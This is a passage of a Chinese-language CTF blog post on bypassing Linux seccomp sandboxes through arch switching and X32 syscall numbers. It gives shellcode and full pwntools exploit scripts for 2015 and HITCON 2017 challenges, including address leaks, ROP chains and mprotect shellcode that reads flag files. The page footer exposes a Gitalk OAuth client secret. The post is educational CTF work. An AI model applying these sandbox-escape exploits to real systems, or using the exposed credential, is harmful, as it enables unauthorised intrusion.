+<p><a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
+<p>使用如下：</p>
+<p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927162846297.png" srcset="/img/loading.gif" lazyload alt="image-20200927162846297"></p>
+<p>可知 限制了 execve函数，和 write 函数的 输出长度等于 0x10时禁止执行 syscall 函数。</p>
+<h2 id="seccomp绕过"><a href="#seccomp绕过" class="headerlink" title="seccomp绕过"></a>seccomp绕过</h2><h4 id="未检查-arch"><a href="#未检查-arch" class="headerlink" title="未检查 arch"></a>未检查 arch</h4><p>当未检查 arch 参数时，可以尝试转换当前的处理器模式，即在32位程序中转到64位或者相反，因为<code>i386</code> 和 <code>x86-64</code> 拥有不同的系统调用号，例如程序为 <code>x86-64</code> 的并且禁止 <code>execve</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">11</span>	<span class="hljs-number">64</span>  	munmap			__x<span class="hljs-number">64</span>_sys_munmap<br><span class="hljs-attribute">59</span>	<span class="hljs-number">64</span>	    execve			__x<span class="hljs-number">64</span>_sys_execve/ptregs<br><span class="hljs-attribute">11</span>	i<span class="hljs-number">386</span>	execve			sys_execve<br></code></pre></div></td></tr></table></figure>
+
+<p>若改变模式让其认为当前正在处理 <code>i386</code> 的程序，那么系统调用号 <code>11</code> 将不会被解析为 <code>__x64_sys_munmap</code> 而是 <code>sys_execve</code> ，这样就绕过了保护。利用条件为：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 未检查arch<br><span class="hljs-bullet">2.</span> 调用号11未被禁止<br><span class="hljs-bullet">3.</span> sys<span class="hljs-emphasis">_mmap或sys_</span>mprotect能用<br></code></pre></div></td></tr></table></figure>
+
+<p>第三点是因为要转换 CPU 的处理模式，所以在大部分情况下很难找到现成的 gadget 利用，需要手动注入shellcode 并能够执行。所以就需要一块可写可执行的内存，这个shellcode 的主要部分如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-symbol">to32:</span>                           <span class="hljs-comment">;;将CPU模式转换为32位</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],<span class="hljs-number">0x23</span>      <span class="hljs-comment">;;32位</span><br>    <span class="hljs-keyword">retf</span><br><span class="hljs-symbol">to64:</span>                           <span class="hljs-comment">;;将CPU模式转换为64位</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>],<span class="hljs-number">0x33</span>      <span class="hljs-comment">;;64位</span><br>    <span class="hljs-keyword">retf</span><br></code></pre></div></td></tr></table></figure>
+
+<p>原理是 <code>RETF</code>指令，能够改变 <code>CS</code> 寄存器，当 <code>CS</code> 为 0x23 时表示当前为 64位，当为 0x33 时表示为32位：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">RETQ：<span class="hljs-keyword">POP</span> <span class="hljs-built_in">RIP</span>   <br><span class="hljs-symbol">RETN:</span> <span class="hljs-keyword">POP</span> <span class="hljs-built_in">EIP</span><br><span class="hljs-symbol">RETF:</span> <span class="hljs-keyword">POP</span> <span class="hljs-built_in">CS</span>:<span class="hljs-built_in">EIP</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="X64下使用-X32"><a href="#X64下使用-X32" class="headerlink" title="X64下使用 X32"></a>X64下使用 X32</h4><p>如果程序开启了 arch 检查，就不能转换 处理器模式了。但是 x86-64 下有一种特殊模式 X32，它使用 64位的存器地址和 32位的地址，此时 nr 会在原来基础上加上 _X32_SYSCALL_BIT (0X400000000)，即原本的 syscall number + 0x40000000，这会达到一样的效果，此时的 shellcode 效果如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-meta">section</span> .text<br><span class="hljs-meta">global</span> my_execve<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">my_execve:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">59</span>+<span class="hljs-number">0x40000000</span>           <span class="hljs-comment">;;只需要把系统调用号加0x40000000即可</span><br>                                    <span class="hljs-comment">;;另外520 或 520+0x40000000 也能用</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">hlt</span><br></code></pre></div></td></tr></table></figure>
+
+<p>还有思路，就是考虑系统有没有没有限制到的 syscall。</p>
+<h2 id="2015-baby-playpen-fence"><a href="#2015-baby-playpen-fence" class="headerlink" title="2015 baby playpen fence"></a>2015 baby playpen fence</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序功能比较简单，就是接受用户的输入，并将用户的输出在 seccomp环境里执行。</p>
+<p>程序使用了 prctl 函数，过滤了部分函数的 syscall，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>       SC_CHECK_ARCH,<br>       SC_LOAD_SYSCALL,<br>       SC_DENY_SYSCALL(open, EINVAL),<br>       SC_DENY_SYSCALL(mmap, EINVAL),<br>       SC_DENY_SYSCALL(openat, EINVAL),<br>       SC_DENY_SYSCALL(open_by_handle_at, EINVAL),<br>       SC_DENY_SYSCALL(ptrace, EINVAL),<br>       SC_ALLOW<br>   &#125;;<br></code></pre></div></td></tr></table></figure>
+
+<p>只禁用了open,mmap,openat, open_by_handle_at和ptrace，没有禁用 execve 函数。</p>
+<p>原WP以及大佬博客上可见：Since 3.4 the Linux kernel has had a feature called the <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/X32_ABI">X32 ABI</a>; 64bit syscalls with 32bit pointers.</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">/usr/include/x86_64-linux-gnu/<span class="hljs-keyword">asm</span>/unistd_x32.h:<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br></code></pre></div></td></tr></table></figure>
+
+<p>Using that syscall, you can bypass the seccomp filter. Blacklisting is bad.</p>
+<p>也就是使用 X32_SYSCALL_BIT 可以绕过 seccomp 的黑名单限制，在上文中 <code>X64下使用X32</code> 提到的，系统调用号如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_stat (__X32_SYSCALL_BIT + 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_fstat (__X32_SYSCALL_BIT + 5)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_lstat (__X32_SYSCALL_BIT + 6)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_poll (__X32_SYSCALL_BIT + 7)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_lseek (__X32_SYSCALL_BIT + 8)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_mmap (__X32_SYSCALL_BIT + 9)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_mprotect (__X32_SYSCALL_BIT + 10)</span><br>......<br></code></pre></div></td></tr></table></figure>
+
+<p>最终可以利用 X32_SYSCALL 来构造 shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">pop rdi<br>xor rsi, rsi<br>mov rax, 0x40000002<br>syscall<br><br>mov rdi, rax<br>sub rsp, 64<br>lea rsi, [rsp]<br>mov rdx, 64<br>mov rax, 0x40000000<br>syscall<br><br>mov rdi, 1<br>mov rdx, rax<br>mov rax, 0x40000001<br>syscall<br><br>mov rax, 0x4000003c<br>xor rdi, rdi<br>syscall<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>debug = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babypf&#x27;</span>)<br>    elf = ELF(<span class="hljs-string">&#x27;./babypf&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">pass</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;LOAD PROGRAM\n&#x27;</span>)<br><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x1010101 ^ 0x7478</span><br><span class="hljs-string">    xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">    mov rax, 0x742e67616c662f2e</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    mov rax,0x40000002</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    sub rsp, 0x1000</span><br><span class="hljs-string">    lea rsi, [rsp]</span><br><span class="hljs-string">    mov rdx, 0x1000</span><br><span class="hljs-string">    mov rax, 0x40000000</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rdx, rax</span><br><span class="hljs-string">    mov rax, 0x40000001</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 0x4000003c</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shell)<br>p.send(p32(<span class="hljs-built_in">len</span>(payload)))<br>p.send(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="2015-big-prison-fence"><a href="#2015-big-prison-fence" class="headerlink" title="2015 big prison fence"></a>2015 big prison fence</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927192512069.png" srcset="/img/loading.gif" lazyload alt="image-20200927192512069"></p>
+<p>和第一个程序的总体功能类似，只不过在 seccomp沙箱这里，启动了更严格的 SECCOMP_MODE_STRICT`(1)，则只允许调用 read，write，exit(not exit_group)，sigreturn 这几个 syscall。</p>
+<p>还有点不懂，后续补坑。</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><h2 id="HITCON-2017-qual"><a href="#HITCON-2017-qual" class="headerlink" title="HITCON 2017 qual"></a>HITCON 2017 qual</h2><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927203558191.png" srcset="/img/loading.gif" lazyload alt="image-20200927203558191"></p>
+<p>程序开启了 prctl 函数。</p>
+<p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927203926028.png" srcset="/img/loading.gif" lazyload alt="image-20200927203926028"></p>
+<p>程序漏洞十分明显，最开始数组初始化话时溢出。后面还分别存在一个 任意位置输出 和 任意位置任意写漏洞。</p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927204135309.png" srcset="/img/loading.gif" lazyload alt="image-20200927204135309"></p>
+<p>分析seccomp 的保护机制，可以看到存在两条绕过路线：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-number">1</span>. 任意函数（不为 mprotect)，只要他的 第二个参数 等于他自己的 系统调用号 即可绕过沙箱检测。<br>func<span class="hljs-selector-class">.sys_number</span> != mprotect_sys_num &amp;&amp; func<span class="hljs-selector-class">.sys_number</span> == func<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[2]</span><br><span class="hljs-number">2</span>. 函数为 mmap或者 mprotect，但是 func<span class="hljs-selector-class">.args</span><span class="hljs-selector-attr">[2]</span> &amp; <span class="hljs-number">0</span>x1 != <span class="hljs-number">1</span> <br>即在mmap或者mprotect时exec位不可被设置<br></code></pre></div></td></tr></table></figure>
+
+<p>利用思路如下：</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-number">1</span>. 调用 mprotect，修改 .bss 的内存保护属性为 可写可执行。（一个内存页只要有了可写可执行权限，那么就算没读权限他也是可读的），需要满足的条件是：<br>mprotec<span class="hljs-variable">t:</span> <span class="hljs-keyword">args</span>[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0</span>x1 != <span class="hljs-number">1</span><br>当我们设置 mprotect 第二个参数即内存也属性为 <span class="hljs-number">0</span>x6 （可读可执行）可以绕过<br><span class="hljs-number">2</span>. 调用 <span class="hljs-keyword">open</span> 函数打开 flag.txt，需要满足：<br><span class="hljs-keyword">open</span>: sys_number == <span class="hljs-keyword">args</span>[<span class="hljs-number">2</span>] == <span class="hljs-number">2</span>(<span class="hljs-keyword">open</span>系统调用号为<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span>. 调用 <span class="hljs-keyword">read</span> 函数读取 flag.txt，没有被限制，可直接执行<br><span class="hljs-number">4</span>. 调用 <span class="hljs-keyword">write</span>函数输出 flag.txt，未限制，可直接执行<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./artifact&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    r.sendlineafter(<span class="hljs-string">&#x27;Choice?\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Idx?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memo</span>(<span class="hljs-params">index, num</span>):</span><br>    r.sendlineafter(<span class="hljs-string">&#x27;Choice?\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Idx?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    r.sendlineafter(<span class="hljs-string">&#x27;Give me your number:\n&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span>():</span><br>    r.sendlineafter(<span class="hljs-string">&#x27;Choice?\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-comment"># leak code base</span><br>show(<span class="hljs-number">0xca</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Here it is: &#x27;</span>)<br>code_base = (<span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffffffffffff</span>) - <span class="hljs-number">0xbb0</span><br>log.success(<span class="hljs-string">&#x27;code base: &#x27;</span> + <span class="hljs-built_in">hex</span>(code_base))<br>bss = code_base + <span class="hljs-number">0x202000</span><br><br><span class="hljs-comment"># leak libc address</span><br>show(<span class="hljs-number">0xcb</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Here it is: &#x27;</span>)<br>libc_base = (<span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffffffffffff</span>) - <span class="hljs-number">0x21bf7</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x215bf</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x23eea</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x1b96</span><br>mprotect = libc_base + libc.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;pop_rdi_ret:&#x27;</span>,<span class="hljs-built_in">hex</span>(pop_rdi_ret)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;pop_rsi_ret:&#x27;</span>,<span class="hljs-built_in">hex</span>(pop_rsi_ret)<br><span class="hljs-comment"># open, read and write /home/artifact/flag</span><br><span class="hljs-comment"># let third argument of open be 2 is to satisfy the seccomp check: sys_number == args[2]</span><br>shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov r8, 0x000000000067616c</span><br><span class="hljs-string">    push r8</span><br><span class="hljs-string">    mov r8, 0x662f746361666974</span><br><span class="hljs-string">    push r8</span><br><span class="hljs-string">    mov r8, 0x72612f656d6f682f</span><br><span class="hljs-string">    push r8</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    mov rdx, 0x2</span><br><span class="hljs-string">    mov rax, 0x2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rsi, &#123;&#125;</span><br><span class="hljs-string">    mov rdx, 0x60</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdx, rax</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rsi, &#123;&#125;</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(bss+<span class="hljs-number">0xf00</span>, bss+<span class="hljs-number">0xf00</span>))<br>gdb.attach(r)<br><span class="hljs-comment">#write rop into ret_addr </span><br>memo(<span class="hljs-number">0xcb</span>, pop_rdi_ret)<br>memo(<span class="hljs-number">0xcc</span>, <span class="hljs-number">0x0</span>)<br>memo(<span class="hljs-number">0xcd</span>, pop_rsi_ret)<br>memo(<span class="hljs-number">0xce</span>, bss+<span class="hljs-number">0xc00</span>)<br>memo(<span class="hljs-number">0xcf</span>, pop_rdx_ret)<br>memo(<span class="hljs-number">0xd0</span>, <span class="hljs-number">0x200</span>)<br>memo(<span class="hljs-number">0xd1</span>, read)<br><br>memo(<span class="hljs-number">0xd2</span>, pop_rdi_ret)<br>memo(<span class="hljs-number">0xd3</span>, bss)<br>memo(<span class="hljs-number">0xd4</span>, pop_rsi_ret)<br>memo(<span class="hljs-number">0xd5</span>, <span class="hljs-number">0xe00</span>)<br>memo(<span class="hljs-number">0xd6</span>, pop_rdx_ret)<br>memo(<span class="hljs-number">0xd7</span>, <span class="hljs-number">0x6</span>) <span class="hljs-comment"># 0x6 &amp; 0x1 != 1</span><br>memo(<span class="hljs-number">0xd8</span>, mprotect)<br><span class="hljs-comment">#gdb.attach(r)</span><br>memo(<span class="hljs-number">0xd9</span>, bss+<span class="hljs-number">0xc00</span>)<br>leave() <span class="hljs-comment"># trigger return to shellcode</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(shellcode)<br><br>r.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yvrctf/2015/tree/master/bigprisonfence">https://github.com/yvrctf/2015/tree/master/bigprisonfence</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yvrctf/2015/tree/master/babyplaypenfence">https://github.com/yvrctf/2015/tree/master/babyplaypenfence</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '2fe1b85c539c7ebb65d656da64ed51c4'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
